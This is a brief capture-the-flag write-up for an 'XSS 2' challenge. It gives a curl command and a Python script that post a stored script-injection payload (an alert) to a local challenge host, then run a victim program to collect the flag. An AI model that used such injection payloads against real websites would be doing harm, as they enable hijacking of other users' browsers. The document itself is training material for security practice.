# XSS 2

#### Just need to add a <script> this challenge:
```
curl -d "content= <script>alert(\"PWNED\")</script>" http://challenge.localhost
```

---------------------------------------------

#### Or the Python version

```python
import requests
import subprocess

url = "http://challenge.localhost/"
data = {
    "content": "<script>alert(\"PWNED\")</script>"
}

req = requests.post(url=url, data=data)
flag = subprocess.run('/challenge/victim')
```
